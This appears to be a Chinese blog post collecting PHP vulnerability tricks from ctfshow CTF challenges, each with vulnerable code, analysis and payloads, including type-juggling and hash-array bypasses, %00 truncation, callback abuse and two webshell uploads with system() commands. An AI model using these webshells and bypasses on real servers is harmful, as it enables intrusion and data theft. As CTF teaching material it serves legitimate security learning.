CTF题目中遇到的PHP考点总结（一）

[ H_00c8](https://www.jianshu.com/u/3cf70976a08b)关注赞赏支持

# CTF题目中遇到的PHP考点总结（一）

up-d5ecf4b19b1b8b696130f64bc77db796046.jpg

## 介绍

本篇文章主要总结了我在写ctfshow题目中遇到的关于PHP的考点。因为只总结知识点和考点会比较空洞，也不容易理解，所以我都是通过题目来总结考点，这样的话比较容易理解。

## PHP函数特性相关

## 一、

考点一：intval函数传入非空数组时会返回1
详情可以查一下PHP手册。【[https://www.php.net/manual/zh/function.intval.php](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.php.net%2Fmanual%2Fzh%2Ffunction.intval.php)】
考点二：preg_match()只能处理字符串，当传入的是数组时将会返回false，详情也可以查一下PHP手册。

**例题** ：

    
    
    include("flag.php");
    highlight_file(__FILE__);
    if(isset($_GET['num'])){
        $num = $_GET['num'];
        if(preg_match("/[0-9]/", $num)){
            die("no no no!");
        }
        if(intval($num)){
            echo $flag;
        }
    }
    
    

**例题分析：**

分析上面的代码可以看出，正则匹配0-9，匹配到则返回true，直接die，但是由于preg_match()只能处理字符串，当传入的是数组时将会返回false,从而绕过死亡函数。由于之前没怎么了解过intval函数，所以我直接选择查阅php手册【[https://www.php.net/manual/zh/function.intval.php](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.php.net%2Fmanual%2Fzh%2Ffunction.intval.php)】查阅后发现
**intval()** 函数用于获取变量的整数值。 **intval()** 函数通过使用指定的进制 base 转换（默认是十进制），返回变量var的
integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回
1。也就是说，当给intval()函数传入一个非空的数组时，intval()函数将会返回1，结合我们preg_match()传入数组返回false的特性，这道题的payload就很清楚了。

    
    
    payload：
    ?num[]=1
    
    

>
> [**【技术文档】**](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.oschina.net%2Faction%2FGoToLink%3Furl%3Dhttps%253A%252F%252Fdocs.qq.com%252Fdoc%252FDVExrc2JqUU1DWWd5)
>
> **1、200多本网络安全系列电子书  
>  2、全套工具包  
>  3、100份src源码技术文档  
>  4、网络安全基础入门、Linux、web安全、攻防方面的视频  
>  5、 网络安全学习路线  
>  6、ctf夺旗赛解析**

## 二、

考点一：PHP比较运算符 ===在进行比较的时候，会先判断两种字符串的类型是否相等，再比较值是否相等。

考点二：intval（![value,](https://math.jianshu.com/math?formula=value%2C)base）当base为0时，会检测value的格式来决定使用的进制。

**例题：**

    
    
    include("flag.php");
    highlight_file(__FILE__);
    if(isset($_GET['num'])){
        $num = $_GET['num'];
        if($num==="4476"){       #   === 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较值是否相等
            die("no no no!");
        }
        if(intval($num,0)===4476){ 
            echo $flag;
        }else{
            echo intval($num,0);
        }
    }
    
    

**例题分析：**

如下图所示，通过查询php手册，我们发现，intval（![value,](https://math.jianshu.com/math?formula=value%2C)base）当base为0时，会检测value的格式来决定使用的进制，所以我们可以通过把4476转换成16进制，经过base为0的intval函数处理，会识别16进制的4476，从而返回flag，又因为===在进行比较的时候，会先判断两种字符串的类型是否相等，再比较值是否相等，所以由于字符串类型不同会返回false，从而绕过死亡函数。

image.png

    
    
    payload:
    ?num=?num=0x117c
    
    

## 三、

考点一：strpos()函数查找字符串在另一字符串中第一次出现的位置并返回

考点二：intval（![value,](https://math.jianshu.com/math?formula=value%2C)base）当base为0时，会检测value的格式来决定使用的进制。

**例题：**

    
    
    if(isset($_GET['num'])){
        $num = $_GET['num'];
        if($num==="4476"){
            die("no no no!");
        }
        if(preg_match("/[a-z]/i", $num)){
            die("no no no!");
        }
        if(!strpos($num, "0")){      #strpos()函数查找字符串在另一字符串中第一次出现的位置并返回。
            die("no no no!");
        }
        if(intval($num,0)===4476){
            echo $flag;
        }
    }
    
    

**例题分析：**

这道题目如果我们可以用八进制的4476来绕过，那么会有一个问题，因为八进制需要开头指定为0，而strpos()会匹配到数字0返回0，!0也就是1从而执行死亡函数，所以我们可以在八进制前面加一个空格，这样strpos()会返回1，所以我们把4476转换为8进制10574后，前面再加一个空格即可。

payload如下：

    
    
    ?num= 010574
    
    

## 四、

考点一：PHP比较运算符 ===在进行比较的时候，会先判断两种字符串的类型是否相等，再比较值是否相等。

考点二：在PHP强比较中变量a、b两个值不一样，要求两者md5值相同时的绕过方法。

考点三：PHP中md5函数处理数组类型会返回falsefalse的特性。

**例题：**

    
    
    if (isset($_POST['a']) and isset($_POST['b'])) {
        if ($_POST['a'] != $_POST['b'])
            if (md5($_POST['a']) === md5($_POST['b']))
                echo $flag;
        else
            print 'Wrong.';
    }
    
    

**例题分析：**

这一道题涉及到了强比较的md5类型，从代码我们可以得知，要求a、b两个值不一样但是需要这两个值得md5值一样，因此强比较类型，我们可以利用md5函数处理数组类型会返回false的特性，从而利用false=false来绕过。我之前写过一篇总结相关知识点的文章链接如下：[https://www.freebuf.com/articles/web/321300.html](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.freebuf.com%2Farticles%2Fweb%2F321300.html)

payload：

    
    
    a[]=1&b[]=2
    
    

## 五、

考点一：in_array ()函数的作用是 检查数组中是否存在某个值，而当in_array()函数没设置第三个参数时进行的比较是弱比较。

考点二：file_put_contents()函数的作用是将一个字符串写入文件。如果写入的字符串和文件名可控则可能导致任意文件上传漏洞。

**例题：**

    
    
    $allow = array();      #创建空数组
    for ($i=36; $i < 0x36d; $i++) {
        array_push($allow, rand(1,$i));    #在1-$i之间随机生成一个整数，添加到数组$allow尾部
    }
    if(isset($_GET['n']) && in_array($_GET['n'], $allow)){
        file_put_contents($_GET['n'], $_POST['content']);
    }
    
    

**例题分析：**

由于之前不怎么了解in_array()函数所以直接查了PHP手册[https://www.php.net/manual/zh/function.in-
array.php](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.php.net%2Fmanual%2Fzh%2Ffunction.in-
array.php)，发现这题在使用in_array()函数时并没有设置第三个参数为TRUE,所以此时in_array函数进行的比较是==的弱类型比较。也就是会先进行强制转换成相同类型，再比较两者的值是否相等，所以当我们传入1.php时会强制转换成数字1，而数字1正好在
range(1,24)数组中，当随机生成的数字正好是1时就可以绕过
in_array()函数判断，导致任意文件上传漏洞。多试几次，直到不报错的那一次，说明成功传入一句话。之后访问1.php
再通过再通过post传入1=system('ls');即可查看目录，再访问这个flag36d.php,即post: 1=`system('cat
flag36d.php');`即可在网页源码中看到flag。

**例题分析：**

由于之前不怎么了解in_array()函数所以直接查了PHP手册[https://www.php.net/manual/zh/function.in-
array.php](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.php.net%2Fmanual%2Fzh%2Ffunction.in-
array.php)，发现这题在使用in_array()函数时并没有设置第三个参数为TRUE,所以此时in_array函数进行的比较是==的弱类型比较。也就是会先进行强制转换成相同类型，再比较两者的值是否相等，所以当我们传入1.php时会强制转换成数字1，而数字1正好在
range(1,24)数组中，当随机生成的数字正好是1时就可以绕过
in_array()函数判断，导致任意文件上传漏洞。多试几次，直到不报错的那一次，说明成功传入一句话。之后访问1.php
再通过再通过post传入1=system('ls');即可查看目录，再访问这个flag36d.php,即post: 1=system('cat
flag36d.php');即可在网页源码中看到flag。

payload:

    
    
    ?n=1.php
    post:   content=<?php eval($_POST[1]);?>  #写入一句话
    

## 六、

考点一： **is_numeric()** 函数用于检测变量是否为数字或数字字符串，如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE。

考点二：php有运算的优先级，而且&& > = > and  
**例题：**

    
    
    include("ctfshow.php");
    //flag in class ctfshow;
    $ctfshow = new ctfshow();
    $v1=$_GET['v1'];
    $v2=$_GET['v2'];
    $v3=$_GET['v3'];
    $v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
    if($v0){
        if(!preg_match("/\;/", $v2)){
            if(preg_match("/\;/", $v3)){
                eval("$v2('ctfshow')$v3");
            }
        }
    }
    

**例题分析：**

**is_numeric()** 函数用于检测变量是否为数字或数字字符串，如果指定的变量是数字和数字字符串则返回 TRUE，否则返回
FALSE。看到最后eval，肯定是需要命令执行，这需要![v2传入命令，](https://math.jianshu.com/math?formula=v2%E4%BC%A0%E5%85%A5%E5%91%BD%E4%BB%A4%EF%BC%8C)v3需要;结尾，但这么一来is_numeric一处理就变成了

    
    
    $vo = $v1 and FALSE and FAlse
    

但php有运算的优先级，也就是&&> = > and  
按照运算优先级，先执行=也就是赋值给$a为true，false就被忽略了，思路也就有了，payload为

    
    
    ?v1=1&v2=system("tac ctfshow.php")&v3=;
    or
    ?v1=1&v2=var_dump($ctfshow)&v3=; #var_dump() 函数用于输出变量的相关信息，这里用来获取ctfshow类中变量的相关信息。从而获得flag
    

得到$flag_is_1ce376300x2d8dc70x2d4b870x2d9f0e0x2d1eea5dada15;，其中0x2d需要替换成-，然而一共35位还少了一位，最后一位需要爆破获得。

## 七、

考点一：is_numeric()
函数用于检测变量是否为数字或数字字符串，如果指定的变量是数字和数字字符串则返回true，否则返回false。如果字符串中含有一个e代表科学计数法，也可返回true

考点二：call_user_func() 函数用于调用方法或者变量，第一个参数是被调用的函数，第二个是调用的函数的参数。

考点三：file_put_contents()函数的作用是将一个字符串写入文件。如果写入的字符串和文件名可控则可能导致任意文件上传漏洞。

考点四：通过file_put_contents()函数配合php://协议以base64编码的形式写入webshell。  
**例题：**

    
    
    <?php
    highlight_file(__FILE__);
    $v1 = $_POST['v1'];
    $v2 = $_GET['v2'];
    $v3 = $_GET['v3'];
    $v4 = is_numeric($v2) and is_numeric($v3); #例题分析 通过将变量v2执行的命令base64加密后转换成16进制字符串来使得变量v4为ture
    if($v4){
        $s = substr($v2,2);
        $str = call_user_func($v1,$s);  #例题分析 通过变量v1调用hex2bin函数将变量v2的16进制字符串转换成原来的base64编码形式
        echo $str;
        file_put_contents($v3,$str);   #例题分析 通过使用php://filter伪协议写入webshell
    }
    else{
        die('hacker');
    }
    

**例题分析：**

首先，get传参v2和v3，post传参v1；if中需要v4为真才能往下执行，而v4要为真就是v2传的参数要为数字或者数字字符串，同时v2也是我们要写入的webshell，为了让v2为数字或者数字字符串，我们可以先把我们的webshell转换为base64编码，再把base64编码转换为16进制，这是一种办法去转换成数字。本地测试代码如下：

    
    
    #本地测试代码
    <?php
    $b = base64_encode('<?=`tac *`;');
    $b = str_replace("=","",$b);
    echo "base64加密后:".$b."\n";
    $a = call_user_func('bin2hex',$b);  #bin2hex可以将base64编码形式转换成16进制字符串形式。
    echo "16进制形式:".$a."\n";
    var_dump(is_numeric($a));
    
    /*运行结果
    base64加密后:PD89YHRhYyAqYDs
    16进制形式:504438395948526859794171594473
    bool(true)
    */
    ?>
    

说明：<?=是php的短标签，是echo()的快捷用法，还有一点，就是substr()取得是从下标为2开始的字符串（字符串下标从0开始），所以我们需要在前面加00两位数  
所以payload为

    
    
    ?v2=00504438395948526859794171594473&v3=php://filter/write=convert.base64-decode/resource=1.php
    
    post:
    v1=hex2bin    #通过hex2bin函数将16进制字符串转换成原来的base64编码形式
    

## 八、

考点：sha1()函数特性，sha1函数无法处理数组，遇到数组会返回NULL

**例题：**

    
    
    <?php
    highlight_file(__FILE__);
    include("flag.php");
    
    if(isset($_POST['v1']) && isset($_GET['v2'])){
        $v1 = $_POST['v1'];
        $v2 = $_GET['v2'];
        if(sha1($v1)==sha1($v2)){
            echo $flag;
        }
    }
    

**例题分析：** sha1函数无法处理数组，遇到数组会返回NULL，因此将两个变量都设置成数组类型即可获得flag。

    
    
    payload如下：
    
    ?v2[]=             #给这两个值赋值与否都不影响
    
    post:
    v1[]=
    

## 九、

考点一：parse_str()函数会将传入的第一个参数设置成变量，如果设置了第二参数，则会将第一个参数的变量以数组元素的形式存入到这个数组。

**例题：**

    
    
    <?php
    highlight_file(__FILE__);
    error_reporting(0);
    include("flag.php");
    
    if(isset($_POST['v1'])){
        $v1 = $_POST['v1'];
        $v3 = $_GET['v3'];
        parse_str($v1,$v2);
        if($v2['flag']==md5($v3)){
            echo $flag;
        }
    }
    

**例题分析：**

看完上面的代码就应该可以知道，这道题的关键就在于parse_str()函数，于是直接查PHP手册中关于parse_str()的介绍。这里附链接：[https://www.php.net/parse_str/](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.php.net%2Fparse_str%2F)
看完后我们可以发现该函数会将传入的第一个参数设置成变量，如果设置了第二参数，则会将第一个参数的变量以数组元素的形式存入到这个数组。分析上面的代码我们知道v1我们可控，并且我们知道v2数组中有flag这个键，因此我们可以通过parse_str()函数将变量v1的变量名和变量值写入数组v2，那么我们就可以覆盖掉flag这个键值对，并且v3我们可控因此就可以绕过下面![v2\['flag'\]==md5\(](https://math.jianshu.com/math?formula=v2%5B'flag'%5D%3D%3Dmd5\()v3)的比较从而输出flag。这样思路有了，我们可以开始构造payload，payload如下：

    
    
    ?v3=1
    POST:v1=flag=c4ca4238a0b923820dcc509a6f75849b   #md5解密后对应1
    

## 十、

考点： ereg()函数的匹配可以被%00截断

**例题：**

    
    
    <?php
    highlight_file(__FILE__);
    error_reporting(0);
    include("flag.php");
    if (ereg ("^[a-zA-Z]+$", $_GET['c'])===FALSE)  {
        die('error');
    }
    //只有36d的人才能看到flag
    if(intval(strrev($_GET['c']))==0x36d){
        echo $flag;
    }
    

**例题分析：**

**ereg()** 函数搜索由指定的字符串作为由模式指定的字符串，如果发现模式则返回true，否则返回false。搜索对于字母字符是区分大小写的

**strrev()** 函数反转字符串。 **intval()**
函数用于获取变量的整数值。首先我们需要知道%00可以截断ereg()函数的搜索，正则表达式只会匹配%00之前的内容；0x36d的十进制内容为877，我们需要字母在前来满足if条件的正则匹配来跳过if语句，接着再进行字符串的反转得到877a，接着intval()函数取整数部分得到877  
所以payload为

    
    
    Code
    ?c=a%00778
    

## 十一、

考点一： **call_user_func()** 函数会执行回调函数，call_user_func()把第一个参数作为回调函数，其余参数都是回调函数的参数

考点二：_()是一个函数 _()等效于gettext() 是gettext()的拓展函数。

考点三：get_defined_vars()函数的作用: 返回由所有已定义变量所组成的数组。

**例题：**

    
    
    <?php
    error_reporting(0);
    include("flag.php");
    highlight_file(__FILE__);
    
    $f1 = $_GET['f1'];
    $f2 = $_GET['f2'];
    
    if(check($f1)){
        var_dump(call_user_func(call_user_func($f1,$f2)));
    }else{
        echo "嗯哼？";
    }
    function check($str){
        return !preg_match('/[0-9]|[a-z]/i', $str);
    }
    

**例题分析：**

**call_user_func()** 函数把第一个参数作为回调函数，其余参数都是回调函数的参数

_()是一个函数 _()等效于gettext() 是gettext()的拓展函数。开启text扩展，需要php扩展目录下有php_gettext.dll

    
    
    #测试代码：
    <?php
    echo gettext("ctfshownb");
    //输出结果：ctfshownb
    
    echo _("ctfshownb");
    //输出结果：ctfshownb
    

get_defined_vars()函数作用: 返回由所有已定义变量所组成的数组 这样可以获得 $flag

整个执行流程就是

    
    
    var_dump(call_user_func(call_user_func($f1,$f2)));
    var_dump(call_user_func(call_user_func(_,'get_defined_vars')));
    var_dump(call_user_func(get_defined_vars));//输出数组
    

**payload: **

    
    
    ?f1=_&f2=get_defined_vars
    

## 十二、

考点： call_user_func(）函数特性

**例题一：**

    
    
    <?php
    error_reporting(0);
    highlight_file(__FILE__);
    class ctfshow
    {
        function __wakeup(){
            die("private class");
        }
        static function getFlag(){
            echo file_get_contents("flag.php");
        }
    }
    call_user_func($_POST['ctfshow']);
    

**例题分析：**

直接调用ctfshow类中的getFlag方法就好，payload为

    
    
    post:
    ctfshow=ctfshow::getFlag
    

**补充：** call_user_func(）函数在PHP手册中的介绍：

    
    
    https://www.php.net/manual/zh/function.call-user-func.php
    

**例题二：**

    
    
    <?php
    error_reporting(0);
    highlight_file(__FILE__);
    class ctfshow
    {
        function __wakeup(){
            die("private class");
        }
        static function getFlag(){
            echo file_get_contents("flag.php");
        }
    }
    if(strripos($_POST['ctfshow'], ":")>-1){
        die("private function");
    }
    call_user_func($_POST['ctfshow']);
    

**例题分析：**

在前一题基础上把冒号给ban了，但call_user_func()支持传入数组形式。

> call_user_func(array($ctfshow, ‘getFlag’));  
>  这时候会调用ctfshow中的getFlag方法

所以payload为

    
    
    post:
    ctfshow[0]=ctfshow&ctfshow[1]=getFlag
    

### 推荐阅读[更多精彩内容 __](https://www.jianshu.com/)

  * [PHP特殊知识点总结](https://www.jianshu.com/p/98c725aa8244)

Buid-in web server内置了一个简单的Web服务器 把当前目录作为Root Document只需要这...

[Success85](https://www.jianshu.com/u/31964a13dfc5)阅读 786评论 1赞 1

  * [php面试笔记（7）-php基础知识-文件及目录处理考点](https://www.jianshu.com/p/ce9bfd855796)

本文是根据慕课网Jason老师的课程进行的PHP面试知识点总结和升华，如有侵权请联系我进行删除，email：guo...

[学长冷月](https://www.jianshu.com/u/ea3d50444d84)阅读 95评论 0赞 0

  * [源码审计-CTF中的常见php函数漏洞以及变量覆盖问题](https://www.jianshu.com/p/df59662bbd53)

CTF中有一类代码审计题目，考察常见的php漏洞函数以及绕过，是web中的基础题目，但如果理解不够透彻很容易做不出...

[kum1ko](https://www.jianshu.com/u/901084663afa)阅读 838评论 0赞 0

  * [PHP代码审计——EASY CTF篇](https://www.jianshu.com/p/42062122d3b4)

0x01 extract变量覆盖 ?shiyan=&flag=1在file_get_contents($flag)...

[Shad0w_zz](https://www.jianshu.com/u/d7ac14212cc8)阅读 3,141评论 0赞 1

  * [PHP知识点总结](https://www.jianshu.com/p/939761d647db)

变量的传值与引用。引用: 不同的变量名指向同一块内存地址 取消copy on write机制 变量的类型转换和判断...

[叶秋real](https://www.jianshu.com/u/2b28b7fbd80f)阅读 385评论 0赞 0

 